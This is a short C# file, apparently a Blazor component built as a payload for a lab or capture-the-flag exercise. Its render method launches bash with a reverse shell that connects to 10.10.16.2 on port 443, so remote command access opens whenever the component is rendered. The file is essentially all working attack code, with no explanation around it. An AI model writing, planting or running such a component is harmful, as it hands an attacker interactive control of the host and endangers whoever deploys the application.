using System;
using System.Diagnostics;
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;

namespace revshell{
  public class Component : ComponentBase{
    protected override void BuildRenderTree(RenderTreeBuilder __builder){
      Process proc = new System.Diagnostics.Process();
      proc.StartInfo.FileName = "/bin/bash";
      proc.StartInfo.Arguments = "-c \"bash -i >& /dev/tcp/10.10.16.2/443 0>&1\"";
      proc.StartInfo.UseShellExecute = false;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.Start();

      while (!proc.StandardOutput.EndOfStream){
        Console.WriteLine(proc.StandardOutput.ReadLine());
      }
    }
  }
}
